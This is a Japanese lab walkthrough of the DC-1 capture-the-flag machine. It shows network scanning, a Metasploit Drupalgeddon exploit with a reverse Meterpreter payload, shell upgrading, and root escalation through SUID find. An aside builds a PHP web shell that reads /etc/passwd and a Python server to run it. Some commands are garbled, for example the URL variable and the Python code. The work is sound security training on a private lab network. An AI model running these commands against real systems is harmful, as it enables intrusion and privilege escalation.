①IPアドレスを調べる									
`$sudo ifconfig`									
　　

②DC-1マシンのIPアドレスを特定する				Pingスイープ：端末が存在するかどうかを調べるために、Pingで広域スキャンすること					
`$sudo fping -aqg 192.168.56.0/24`									

③特定したIPアドレスを環境変数に設定する					※何度も使うから			
`$export IP=192.168.56.103`									

④ポートスキャンする									
`$nmap -sC -sV -p 1-65535 $IP`									
※出力結果から22(SSH)、80(http)、111(RPCBIND)、3306(MySQL)									
⑤HTTPサービスにアクセス※ブラウザにて									
[`http://192.168.56.103/`](http://192.168.56.103/)									
⑥よく使われる"robots.txt"ファイルにアクセス※ブラウザにて									
[`http://192.168.56.103/robots.txt`](http://192.168.56.103/robots.txt)									
Disallow: /MAINTAINERS.txt　←注目									
Disallwフィールドはクローラー（検索エンジンのデータベース作成に用いられる巡回プログラム）による巡回を拒否するものだが、ブラウザからアクセス可能									
⑦URLを環境変数に設定する									
`$export URL="http://:80$IP/"`									
⑧Webサービスでスキャン									
⑧ー①NATに切り替えてdroopescanをインストール									
`$python3 -m venv myenv`									
`$source myenv/bin/activate`									
`$pip install droopescan`									
⑧ー②ホストオンリーに切り替え、DC-1マシンをスキャン									
`$droopescan scan drupal -u $URL`								
⑨Drupal用のExploitを探す※ブラウザにて									
[`https://www.exploit-db.com/exploits/35150`](https://www.exploit-db.com/exploits/35150)									
Drupal 7 remote		→検索							
脆弱性の名前として「Drupalgeddon」をメモ	
→Drupal のSQLインジェクションの脆弱性の通称				
⑩MetasploitでDrupalgeddonを狙う									
`$msfconsole`									
`[msf](Jobs:0 Agents:0) >> search type:exploit drupal`									
`[msf](Jobs:0 Agents:0) >> use exploit/multi/http/drupal_drupageddon`									
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp							←リバース型のペイロードがセットされた		
※今回の実験ではRHOSTS,RPORT,TARGETURIを設定（RHOST以外はデフォルトでOK）									
`[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set RHOSTS 192.168.56.103`									
`[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> show options`									
LHOSTが127.0.0.1だとExploitの攻撃が成功してもペイロードの接続先がloclhostになってしまい、ターゲット端末そのものになるため変更									
`[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set LHOST 192.168.56.101`									
⑪Exploitモジュールを実行									
`[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> run`									
MeterpreterプロンプトからMeterpreterに用意されたコマンドが使用可能になる									
例） `$ls`									
ユーザー権限で閲覧できるようなファイルにもヒントが書かれていることがある									
`(Meterpreter 1)(/var/www) > cat flag1.txt`									
⑫Meterpreterセッションからシェルに切り替え									
`(Meterpreter 1)(/var/www) > shell`									
id									
uid=33(www-data) gid=33(www-data) groups=33(www-data)						→www-dataユーザーであることが分かった			
⑬対話的シェルを奪取する									
which python 		←入力							
/usr/bin/python		←結果							
python -c 'import pty; pty.spawn("/bin/bash")'					←入力				
www-data@DC-1:/var/www$ 			←結果						
www-data@DC-1:/var/www$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/usr/games:/tmp									←パスを追加する
www-data@DC-1:/home$ alias ll='ls -la --color=auto'						llコマンドで色をつけてファイルを列挙できるようにする			
⑭OSを特定する									
システム内に簡単に攻められる脆弱性が見つからない場合、カーネルベースの脆弱性を突いて権限の昇格を狙う									
www-data@DC-1:/$ uname -a									
Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux									
www-data@DC-1:/$ cat /etc/*-release							→Debian　バージョン７		
www-data@DC-1:/$ cat /etc/issue									
⑮システム内を探索する									
www-data@DC-1:/home$ ll									
rwxr-xr-x  3 root  root  4096 Feb 19  2019 .									
drwxr-xr-x 23 root  root  4096 Feb 19  2019 ..									
drwxr-xr-x  2 flag4 flag4 4096 Feb 19  2019 flag4					→見てみる				
⑯一時ファイルの置き場所を調べる				今回の位置ファイルの定義：プログラムの実行中に一時的に必要に萎えるデータやプログラム間のデータの受け渡しに使われるファイル					
/tmpと/dev/shmが候補									
www-data@DC-1:/var/tmp$ cd /dev/shm									
www-data@DC-1:/var/tmp$ cd /tmp									
⑰ＳＵＩＤファイルを検索			←定石						
www-data@DC-1:/$ find / -perm -u=s -type f 2> /dev/null									
⑱findコマンドを利用してシェルを奪う									
GTFOBins	→https://gtfobins.githb.io				←シェルを奪うコマンド例を調べられる				
www-data@DC-1:/$ which find									
www-data@DC-1:/$ /usr/bin/find . -exec /bin/bash -p \; -quit									
bash-4.2# 	←管理者権限のプロンプトが返ってくる								
⑲フラグファイルを開く

完									
余談									
python３の簡易HTTPサーバーとPHPの関係									
①maliciousファイルを作成してみる									
$echo '<?php system("cat /etc/passwd");?>' > malicious.php									
↓分解する									
<?php...?>		PHPコードであることを表す							
system():		サーバー上でコマンドを実行する命令							
cat /etc/passwd		ファイルを閲覧							
②簡易HTTPサーバーを立ち上げる									
$sudo python3 -m http.server			※maliciousファイルが存在するディレクトリで行う						
③ブラウザからmaliciousファイルにアクセスする									
http://localhost:8000/malicious.php									
④maliciousファイルを保存するか否かの挙動が起こり、PHPコード自体は実行されない

なぜか…									
pythonのhttp.serverは、ただファイルを「提供する」のみ									
HTMLや画像などの静的なファイルを扱うことはできるがＰＨＰコードを実行する機能をもっていない									
PHPを動かすにはApacheやNginxのようにPHPを解釈するための特別な設定がされたウェブサーバーが必要

それを踏まえてＰＨＰをじっこうしたい！！
①php_server.pyファイル作成（ソースコード）

`import http.server
import os
import subprocess
from urllib.parse import unquote`

`class PHPRequestHandler(http.server.SimpleHTTPRequestHandler):
def do_GET(self):
if self.path.endswith(".php"):
self.send_response(200)
self.send_header("Content-Type", "text/html")
self.end_headers()
path = unquote(self.path[1:])
output = subprocess.check_output(["php", path])
self.wfile.write(output)
else:
super().do_GET()`

`if **name** == "**main**":
http.server.test(HandlerClass=PHPRequestHandler)`

②pythonの簡易httpseverで待機
$python3 php_server.py
③ブラウザにアクセス

http://localhost:8000/malicious.php

![kekka.png](../images/kekka.png)

etc/passwdファイルが出力されている				→PHPファイルが動作している			
④curlコマンドでも実行可能							
$curl -X GET http://localhost:8000/malicious.php
